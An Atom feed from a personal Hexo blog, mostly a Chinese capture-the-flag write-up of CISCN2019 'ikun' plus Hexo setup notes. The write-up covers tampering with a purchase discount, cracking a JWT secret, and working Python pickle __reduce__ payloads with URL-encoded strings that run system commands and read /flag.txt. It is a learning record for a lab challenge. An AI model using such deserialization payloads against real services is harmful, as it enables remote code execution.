<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>First article</title>
  
  
  <link href="http://van0308.github.io.git/atom.xml" rel="self"/>
  
  <link href="http://van0308.github.io.git/"/>
  <updated>2023-02-04T13:17:05.096Z</updated>
  <id>http://van0308.github.io.git/</id>
  
  <author>
    <name>Van</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>待学</title>
    <link href="http://van0308.github.io.git/2023/02/03/%E5%BE%85%E5%AD%A6/"/>
    <id>http://van0308.github.io.git/2023/02/03/%E5%BE%85%E5%AD%A6/</id>
    <published>2023-02-03T15:47:07.000Z</published>
    <updated>2023-02-04T13:17:05.096Z</updated>
    
    <content type="html"><![CDATA[<p>pickle反序列化</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;pickle反序列化&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2ikun</title>
    <link href="http://van0308.github.io.git/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/"/>
    <id>http://van0308.github.io.git/2023/02/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2ikun/</id>
    <published>2023-02-03T15:46:44.000Z</published>
    <updated>2023-02-04T13:15:57.090Z</updated>
    
    <content type="html"><![CDATA[<p>打开发现是商场购物页面</p><p>提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面</p><p>点商品，注意有两个，一个是商品详情页，一个是直接点购买</p><p>抓包发现</p><p>有price还有折扣，发现改price怎么改都不行，那么就试试只改折扣。</p><p>暴露了后台地址，访问发现只能admin</p><p>又注意到抓包有jwt。</p><p>解密 <a href="https://jwt.io/">https://jwt.io/</a></p><p>要改则必须破解密码 利用 c-jwt-cracker</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack   加密后的结果</span><br></pre></td></tr></table></figure><p>密钥1Kun</p><p>改完重新发包，点击一键成为大会员没什么用</p><p>看源代码，发现泄露，下载完审计</p><p>发现有hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br><span class="line">Unicode解码得</span><br><span class="line">这网站不仅可以以薅羊毛，我还留了个后门，就藏在lv6里</span><br></pre></td></tr></table></figure><p>找后门</p><p>在Admin.py找到</p><p>pickle：Python对象的持久化存储</p><p>功能：将任意Python对象存储及恢复</p><p>关键函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()   文件</span><br><span class="line">pickle.load()</span><br><span class="line">pickle.dumps()字符串</span><br><span class="line">pickle.loads()</span><br><span class="line">dump()：将 Python 中的对象序列化成二进制对象，并写入文件；</span><br><span class="line">load()：读取指定的序列化数据文件，并返回对象。</span><br><span class="line">dumps()：将 Python 中的对象序列化成二进制对象，并返回；</span><br><span class="line">loads()：读取给定的二进制对象数据，并将其转换为 Python 对象；</span><br></pre></td></tr></table></figure><p>具体用法</p><p>​<a href="http://c.biancheng.net/view/5736.html">Python pickle模块：实现Python对象的持久化存储 (biancheng.net)</a></p><p>反序列化详解</p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p>只要在序列化中的字符串中存在<code>R</code>指令，<code>__reduce__</code>方法就会被执行，无论正常程序中是否写明了<code>__reduce__</code>方法</p><p>记得生成payload时使用的python版本尽量与目标上的版本一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = pickle.loads(urllib.unquote(become))</span><br><span class="line"></span><br><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式</span><br><span class="line">pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</span><br><span class="line"></span><br><span class="line">在 Python2.x 中的用法是：</span><br><span class="line">urllib.quote(text)</span><br><span class="line">Python3.x 中是</span><br><span class="line">urllib.parse.quote(text)</span><br><span class="line">URL 中传参数的部分（query String），格式是：</span><br><span class="line">name1=value1&amp;name2=value2&amp;name3=value3</span><br><span class="line">假如你的 name 或者 value 值中有『&amp;』或者『=』等符号，就当然会有问题。所以URL中的参数字符串也需要把『&amp;=』等符号进行编码。</span><br><span class="line">URL编码的方式是把需要编码的字符转化为 %xx 的形式。</span><br></pre></td></tr></table></figure><p>继续做题</p><p>点击一键成为大会员，抓包发现become参数，利用reduce方法构造poc，修改become值，执行命令</p><p>Python2和Python3的执行结果不同，下面Python2的成功了（不明原因）</p><p>读取目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))<span class="comment"># reduce第二个参数得是元组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="comment">#print a</span></span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br><span class="line"><span class="comment"># cposix%0Alistdir%0Ap0%0A%28S%27/%27%0Ap1%0Atp2%0ARp3%0A.  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.listdir, (<span class="string">&#x27;/&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># cnt%0Alistdir%0Ap0%0A%28V/%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><p>最后执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ikun</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="comment"># return (os.listdir, (&#x27;/&#x27;,))</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(ikun(), protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">a = urllib.parse.quote(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment"># c__builtin__%0Aeval%0Ap0%0A%28V__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一些可执行的</span><br><span class="line"><span class="comment"># 未导入os模块，通用</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;calc.exe&#x27;</span>,))</span><br><span class="line"><span class="comment"># return eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"><span class="comment"># return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"><span class="comment"># return map, (__import__(&#x27;os&#x27;).system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 导入os模块</span></span><br><span class="line"> <span class="comment"># return (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return eval, (&quot;os.system(&#x27;calc.exe&#x27;)&quot;,)</span></span><br><span class="line"> <span class="comment"># return map, (os.system, (&#x27;calc.exe&#x27;,))</span></span><br><span class="line"> <span class="comment"># return map, (os.system, [&#x27;calc.exe&#x27;])</span></span><br><span class="line"> <span class="comment"># return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span></span><br></pre></td></tr></table></figure><p>深入学习：</p><p><a href="https://xz.aliyun.com/t/7436">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/361349643">pickle反序列化的利用技巧总结 - 知乎 (zhihu.com)</a></p><p><a href="https://www.cnblogs.com/sijidou/p/16305695.html">CTF-python pickle反序列化 - sijidou - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/11807">最近碰到的 Python pickle 反序列化小总结 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.secpulse.com/archives/127664.html">python反序列化攻击 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p><p><a href="https://www.freebuf.com/articles/web/264363.html">Python pickle 反序列化详解 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开发现是商场购物页面&lt;/p&gt;
&lt;p&gt;提示要买lv6，点下一页看看，还是一堆商品，感觉是要写脚本找到lv6，调试一下找到lv相关信息，写脚本找到。在page181里面&lt;/p&gt;
&lt;p&gt;点商品，注意有两个，一个是商品详情页，一个是直接点购买&lt;/p&gt;
&lt;p&gt;抓包发现&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="pickle反序列化" scheme="http://van0308.github.io.git/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>hexo+GitHub+butterfly</title>
    <link href="http://van0308.github.io.git/2023/02/03/hexo-GitHub-butterfly/"/>
    <id>http://van0308.github.io.git/2023/02/03/hexo-GitHub-butterfly/</id>
    <published>2023-02-03T14:16:02.000Z</published>
    <updated>2023-02-04T08:03:54.052Z</updated>
    
    <content type="html"><![CDATA[<h4 id="hexo操作"><a href="#hexo操作" class="headerlink" title="hexo操作"></a>hexo操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在blog文件夹下打开git bash（存放hexo源码那个文件夹）</span><br><span class="line">hexo clean 清除</span><br><span class="line">hexo g  生成</span><br><span class="line">hexo s  本地模拟</span><br><span class="line">hexo d  上传到远端</span><br><span class="line">重新上传得要  先清除、生成再上传</span><br></pre></td></tr></table></figure><h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p>图床，就是专门用来存放图片的服务器，更多的是指提供图片外链的服务，有免费图床，也有付费图床。</p><h3 id="hexo坑"><a href="#hexo坑" class="headerlink" title="hexo坑"></a>hexo坑</h3><h4 id="文章标题"><a href="#文章标题" class="headerlink" title="文章标题"></a>文章标题</h4><p>如果是标题为[CISCN2019 华北赛区 Day1 Web2]ikun则会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR Process failed: _posts/111.md</span><br><span class="line">YAMLException: bad indentation of a mapping entry (1:34)</span><br><span class="line"></span><br><span class="line"> 1 | title: [CISCN2019 华北赛区 Day1 Web2]ikun</span><br><span class="line">--------------------------------------^</span><br><span class="line"> 2 | date: 2023-02-03 23:46:44</span><br><span class="line"> 3 | tags:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果改成其他的则不会，不过有些不符合规则还是会</p><p>（坑，待填）</p><h4 id="报错、缩进问题"><a href="#报错、缩进问题" class="headerlink" title="报错、缩进问题"></a>报错、缩进问题</h4><p><a href="https://www.yamllint.com/">https://www.yamllint.com/</a>    可以在这个网站里面检查</p><h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><h4 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h4><p><a href="https://hexo.io/zh-cn/docs/writing">写作 | Hexo</a></p><p><a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><h4 id="一些教程"><a href="#一些教程" class="headerlink" title="一些教程"></a>一些教程</h4><p><a href="https://www.bilibili.com/read/cv12633102">2021最全hexo搭建博客+matery美化+使用（保姆级教程） - 哔哩哔哩 (bilibili.com)</a></p><h4 id="便捷化"><a href="#便捷化" class="headerlink" title="便捷化"></a>便捷化</h4><p>hexo-admin  <a href="https://jaredforsyth.com/hexo-admin/admin/#/">Hexo Admin (jaredforsyth.com)</a></p><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>目录 </p><p>代码块</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;hexo操作&quot;&gt;&lt;a href=&quot;#hexo操作&quot; class=&quot;headerlink&quot; title=&quot;hexo操作&quot;&gt;&lt;/a&gt;hexo操作&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    
    <category term="个人博客" scheme="http://van0308.github.io.git/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://van0308.github.io.git/2023/02/02/hello-world/"/>
    <id>http://van0308.github.io.git/2023/02/02/hello-world/</id>
    <published>2023-02-02T09:13:27.137Z</published>
    <updated>2023-02-02T09:13:27.137Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
